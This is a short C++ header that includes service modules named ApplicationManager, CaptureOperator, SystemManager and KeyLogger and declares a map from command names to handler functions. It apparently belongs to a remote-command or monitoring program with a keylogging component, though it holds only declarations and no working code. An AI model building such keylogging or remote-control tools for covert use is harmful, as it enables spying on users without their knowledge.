#pragma once

#include <map>

#include "services/ApplicationManager.h"
#include "services/CaptureOperator.h"
#include "services/SystemManager.h"
#include "services/KeyLogger.h"

namespace Services {
    extern std::map<std::pair<std::string, std::string>, bool(*)(const std::string&)> servicesMap;
    // bool processCommand(std::string &command);
}